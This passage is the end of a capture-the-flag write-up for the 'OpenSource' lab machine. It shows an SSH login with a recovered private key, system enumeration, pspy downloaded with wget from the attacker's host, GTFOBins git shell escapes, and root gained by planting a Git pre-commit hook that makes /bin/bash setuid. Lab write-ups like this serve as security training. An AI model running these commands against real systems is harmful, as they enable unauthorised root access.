+</code></pre></div><p>Now, let&rsquo;s access through SSH using the private key:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> 600 <span class="mtku">home-backup/.ssh/id_rsa</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">home-backup/.ssh/id_rsa</span> dev01@10.10.11.164  
+<span class="code-green">dev01@opensource</span>:<span class="code-blue">~</span>$ cat user.txt
+d2d88b24d324fb497c67d10a9c691310
+</code></pre></div><h2 id="system-enumeration">System enumeration</h2><p>Basic enumeration does not show anything useful:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev01@opensource</span>:<span class="code-blue">~</span>$ id
+uid=1000(dev01) gid=1000(dev01) groups=1000(dev01)
+<span class="code-green">dev01@opensource</span>:<span class="code-blue">~</span>$ sudo -l
+[sudo] password for dev01:
+Sorry, user dev01 may not run sudo on opensource.
+<span class="code-green">dev01@opensource</span>:<span class="code-blue">~</span>$ find / -perm -4000 2&gt;/dev/null | grep -v snap  
+/bin/fusermount
+/bin/umount
+/bin/mount
+/bin/su
+/bin/ping
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chfn
+</code></pre></div><p>If we use <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a> to enumerate running processes, we can see some Git commands that are interesting:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev01@opensource</span>:<span class="code-blue">~</span>$ cd /tmp
+<span class="code-green">dev01@opensource</span>:<span class="code-blue">/tmp</span>$ wget 10.10.17.44:8000/pspy64s -qO .pspy  
+<span class="code-green">dev01@opensource</span>:<span class="code-blue">/tmp</span>$ chmod +x .pspy
+<span class="code-green">dev01@opensource</span>:<span class="code-blue">/tmp</span>$ ./.pspy
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">...
+<span class="code-blue">CMD: UID=0    PID=2689   | /usr/sbin/CRON -f</span>
+<span class="code-blue">CMD: UID=0    PID=2697   | /bin/bash /root/meta/app/clean.sh</span>
+<span class="code-blue">CMD: UID=0    PID=2696   | cp /root/config /home/dev01/.git/config</span>
+<span class="code-blue">CMD: UID=0    PID=2698   | /bin/bash /usr/local/bin/git-sync</span>
+<span class="code-blue">CMD: UID=0    PID=2702   | git commit -m Backup for 2022-07-05</span>
+<span class="code-blue">CMD: UID=0    PID=2706   | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git</span>  
+<span class="code-blue">CMD: UID=0    PID=2705   | cut -d  -f1</span>
+<span class="code-blue">CMD: UID=0    PID=2704   | /snap/bin/docker exec upcloud6000 hostname -i</span>
+<span class="code-blue">CMD: UID=0    PID=2703   | git push origin main</span>
+...
+</code></pre></div><p>Basically, it is committing some changes in a repository every minute.</p><h2 id="privilege-escalation">Privilege escalation</h2><p>The idea here is that we can use Git hooks to execute scripts, either before commit of after commit. We can see some useful commands in <a href="https://gtfobins.github.io/gtfobins/git/#shell">GTFOBins</a>, or the same information using my tool <a href="https://github.com/7Rocky/gtfobins-cli"><code>gtfobins-cli</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gtfobins-cli</span> --shell git
+
+<span class="code-bg-green code-black">git</span> ==&gt; <span class="code-yellow">https://gtfobins.github.io/gtfobins/git/</span>
+
+
+<span class="code-red mtku">Shell</span>
+
+It can be used to break out from restricted environments by spawning an interactive system shell.
+
+<span class="code-cyan">PAGER='sh -c "exec sh 0&lt;&1"' git -p help</span>
+
+This invokes the default pager, which is likely to be <span class="code-cyan">less</span>, other functions may apply.
+
+<span class="code-cyan">git help config</span>
+<span class="code-cyan">!/bin/sh</span>
+
+The help system can also be reached from any <span class="code-cyan">git</span> command, e.g., <span class="code-cyan">git branch</span>. This invokes the default pager, which is likely to be <span class="code-cyan">less</span>, other functions may apply.
+
+<span class="code-cyan">git branch --help config</span>
+<span class="code-cyan">!/bin/sh</span>
+
+Git hooks are merely shell scripts and in the following example the hook associated to the <span class="code-cyan">pre-commit</span> action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the <span class="code-cyan">-C</span> option.  
+
+<span class="code-cyan">TF=$(mktemp -d)</span>
+<span class="code-cyan">git init "$TF"</span>
+<span class="code-cyan">echo 'exec /bin/sh 0&lt;&2 1&gt;&2' &gt;"$TF/.git/hooks/pre-commit.sample"</span>
+<span class="code-cyan">mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"</span>
+<span class="code-cyan">git -C "$TF" commit --allow-empty -m x</span>
+
+<span class="code-cyan">TF=$(mktemp -d)</span>
+<span class="code-cyan">ln -s /bin/sh "$TF/git-x"</span>
+<span class="code-cyan">git "--exec-path=$TF" x
+</code></pre></div><p>Alright, so we must enter a command in a file called <code>pre-commit</code> (without <code>.sample</code> suffix) inside <code>.git/hooks</code>. For instance, let&rsquo;s add SUID permissions to <code>/bin/bash</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev01@opensource</span>:<span class="code-blue">/tmp</span>$ echo 'chmod 4755 /bin/bash' &gt; ~/.git/hooks/pre-commit  
+<span class="code-green">dev01@opensource</span>:<span class="code-blue">/tmp</span>$ chmod +x ~/.git/hooks/pre-commit
+<span class="code-green">dev01@opensource</span>:<span class="code-blue">/tmp</span>$ ls -l /bin/bash
+-rwxr-xr-x 1 root root 1113504 Apr 18 15:08 <span class="code-green">/bin/bash</span>
+</code></pre></div><p>After some seconds, the script is executed by <code>root</code> when doing <code>git commit</code> and <code>/bin/bash</code> becomes a SUID binary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev01@opensource</span>:<span class="code-blue">/tmp</span>$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1113504 Apr 18 15:08 <span class="code-white code-bg-red">/bin/bash</span>  
+</code></pre></div><p>So, we can run Bash as <code>root</code> and get the <code>root.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev01@opensource</span>:<span class="code-blue">/tmp</span>$ bash -p
+bash-4.4# cat /root/root.txt
+a470e19e4c146962df93f39de9df63e7  
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem"><p class="f5 b mb3">Contents of this write-up</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#git-enumeration">Git enumeration</a></li><li><a href="#static-source-code-analysis">Static source code analysis</a></li><li><a href="#access-to-console">Access to console</a></li><li><a href="#container-enumeration">Container enumeration</a></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>
